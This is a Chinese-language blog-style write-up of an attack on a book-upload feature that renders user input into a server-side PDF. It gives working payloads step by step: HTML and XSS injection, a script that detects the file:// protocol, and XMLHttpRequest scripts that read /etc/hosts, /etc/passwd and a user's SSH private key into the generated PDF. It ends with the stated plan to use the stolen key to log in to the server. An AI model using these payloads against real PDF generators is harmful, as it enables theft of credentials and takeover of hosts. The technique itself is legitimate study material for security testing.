## **一 前言**  

作为一名漏洞复现工程师的我在试图挖掘XSS漏洞时,不论是正常的输入payload触发XSS还是通过导入xls、pdf等文件进行解析或者自己输出内容生成xls pdf文件时触发XSS，总喜欢浅尝辄止,看到触发了XSS漏洞就可以了。

有时候多想一步看看是否可以结合本地文件包含或者SSRF漏洞，实现漏洞利用的最大化。

## **二 准备阶段**

这是一个读者可以上传图书内容的功能，读者在前台上传了之后会在后台生成一个PDF文件,一般情况下基于用户输入生成PDF文件的地方可能容易受到XSS的攻击，从而泄露服务器的敏感数据。

  

用户可以在该处输入书名、作者，以及上传图书内容  

![](../Images/aea5449e683bc44cef7d3685bcb4cc7a.png)

  

用户上传之后会在后台生成一个包含书名 作者 书的内容链接的pdf文件  

  

![](../Images/ba503301b8eab92bb17e1ff5f954b692.png)

  
一般的测试步骤如下

  
1 找到可控的输入  
2 尝试对输入进行HTML标记，看是否可以解析HTML  
3 测试不同的协议(比如file http https),尝试读取内部文件(这是最重要的,探测到使用的是什么协议才方便来读物内部文件)  
4 使用JS注入来读取内部文件  

  

## **三 漏洞利用**

根据上面的步骤一步步来

  
在输入框输入

# r3dbucket

然后在后台生成了一个PDF文件,我们打开PDF,可以看到HTML的标签被解析了  

  

![](../Images/ea1556274e8296c6718ed903788002a5.png)

  
基础有了，感觉有戏，写个XSS payload,增强下信心

  

```
<img src\="x" onerror\="document.write('test')" />

```

  

![](../Images/045f1f5836491c013c7572c42d565170.png)

  
内心毫无激动，常规操作了(内心慌的很，生怕在进行各种绕过)  

![](../Images/27e8813d82f3327f35c6e3bde52edcf9.png)

  

接下来探测下使用的是什么协议,方便进行文件的读取操作  

  

```
<script\>document.write(document.location.href)</script\>

```

![](../Images/c730d3a1eb8adfcef37b1728e37b08b7.png)

  
可以看到用的是file协议，然后构造payload进行文件的读取，读取下hosts文件和passwd文件，构造payload如下  

```
<script\>x\=new XMLHttpRequest;x.onload\=function(){document.write(this.responseText)};x.open(‘GET’,’file:///etc/hosts’);x.send();</script\>

<script\>x\=new XMLHttpRequest;x.onload\=function(){document.write(this.responseText)};x.open(‘GET’,’file:///etc/passwd’);x.send();</script\>

```

  

可以看到我们的payload是成功的，成功读取到了hosts文件和passwd文件的内容  

  

![](../Images/bc5e20e91f03fc08d62863469b15eea7.png)

  

![](../Images/3091159089a97d17607f2fea9b36bb72.png)

  
拿下主机权限是我们的最终目标，尝试去读取id\_rsa  

```
<script\>x\=new XMLHttpRequest;x.onload\=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id\_rsa");x.send();</script\>

```

  

![](../Images/5409bd0b5ee44b2e3f5739b13d8d4241.png)

  
接下来就是进行图片文字识别，然后进行登录了。
